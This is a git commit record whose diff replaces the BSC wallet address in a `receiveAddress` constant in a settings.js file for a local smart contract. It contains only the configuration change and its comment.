aa65bf2d9e0414e1240f5d06a553a731a30dd2f0
toryee00 <travishub@yahoo.com>
2024-05-04 01:37:05 -0700

    settings.js

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "0x5b3606F7dF5ce9fF4e79Cd9094d4D5a135cf147F";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x394A1b18B3fee6bBaBCe2B2C8116B5E270917187";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
